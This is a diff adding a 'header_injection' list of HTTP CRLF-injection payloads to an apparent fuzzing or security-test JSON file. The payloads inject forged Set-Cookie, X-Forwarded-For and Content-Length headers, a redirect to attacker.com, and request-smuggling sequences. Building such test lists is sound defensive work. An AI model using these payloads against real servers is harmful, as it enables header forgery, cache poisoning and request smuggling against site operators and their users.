@@ -93,6 +93,23 @@
       "\r\n",
       "\u00A0",
       "\u2003"
+    ],
+
+    "header_injection": [
+      "\\r\\nContent-Length: 0\\r\\n",
+      "\\r\\nSet-Cookie: admin=true",
+      "\\r\\nX-Forwarded-For: 127.0.0.1",
+      "\\r\\nLocation: http://attacker.com",
+      "\\r\\n\\r\\nGET / HTTP/1.1",
+      "%0d%0aContent-Length: 0",
+      "%0d%0aSet-Cookie: admin=true",
+      "%0d%0aX-Forwarded-For: 127.0.0.1",
+      "%0aContent-Length: 0",
+      "%0aSet-Cookie: admin=true",
+      "\\nContent-Length: 0",
+      "\\nSet-Cookie: admin=true",
+      ";Content-Length: 0", 
+      ",Content-Length: 0"
     ]
   },
   "notes": [
